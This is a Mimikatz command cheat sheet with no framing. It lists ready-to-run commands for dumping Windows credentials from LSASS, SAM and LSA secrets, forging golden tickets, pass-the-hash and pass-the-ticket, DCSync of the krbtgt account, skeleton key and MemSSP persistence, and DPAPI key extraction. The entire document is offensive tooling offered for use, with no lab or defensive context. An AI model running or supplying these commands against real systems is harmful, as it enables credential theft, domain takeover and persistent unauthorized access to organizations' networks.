### Quick Reference - Most Used Commands
# Dump everything (most common)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump SAM
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# Dump LSASS to file
mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "exit"

# Golden ticket
mimikatz.exe "kerberos::golden /domain:domain.local /sid:SID /krbtgt:HASH /user:Administrator /ticket:golden.kirbi" "exit"

# Pass the hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH" "exit"

# Pass the ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# Overpass the hash
mimikatz.exe "sekurlsa::pth /user:user /domain:domain.local /ntlm:HASH /run:powershell.exe" "exit"

# Skeleton key (on DC)
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# DCSync (simulate DC)
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"

### Complete Command List
==================== PRIVILEGE COMMANDS ====================
privilege::debug                    # Enable debug privilege (MUST run first)
token::elevate                      # Elevate to SYSTEM
token::whoami                       # Show current token
token::list                         # List all tokens
process::list                       # List processes
process::suspend PID                # Suspend process
process::stop PID                   # Stop process
process::start exe                  # Start process

==================== CREDENTIAL EXTRACTION ====================
sekurlsa::logonpasswords            # Dump all credentials
sekurlsa::wdigest                   # Dump WDigest passwords
sekurlsa::tspkg                     # Dump TsPkg credentials
sekurlsa::credman                   # Dump CredMan credentials
sekurlsa::ekeys                     # Dump Kerberos keys
sekurlsa::dpapi                     # Dump DPAPI keys
sekurlsa::minidump lsass.dmp        # Load LSASS dump for offline analysis

==================== KERBEROS ====================
kerberos::list                      # List tickets
kerberos::ptt ticket.kirbi          # Pass the ticket
kerberos::purge                     # Purge all tickets
kerberos::ask /target:SPN           # Request service ticket
kerberos::golden /domain:domain.local /sid:SID /krbtgt:HASH /user:User /ticket:ticket.kirbi  # Create golden ticket

==================== SAM & SECURITY ====================
lsadump::sam                        # Dump SAM (requires SYSTEM)
lsadump::sam /sam:SAM /system:SYSTEM # Dump SAM offline
lsadump::secrets                    # Dump LSA secrets
lsadump::cache                      # Dump domain cache
lsadump::lsa /inject                # Dump LSA
lsadump::dcsync /user:krbtgt        # DCSync attack
lsadump::dcsync /all                # DCSync all users

==================== LSASS DUMP ====================
sekurlsa::minidump lsass.dmp        # Load dump for analysis
# Then run any sekurlsa command

==================== MISC ====================
misc::skeleton                      # Install skeleton key
misc::memssp                        # Install MemSSP
vault::cred                         # List Windows Vault
vault::list                         # List vaults
dpapi::masterkey                    # Extract DPAPI master keys
crypto::cng                         # List CNG keys
crypto::certificates                # List certificates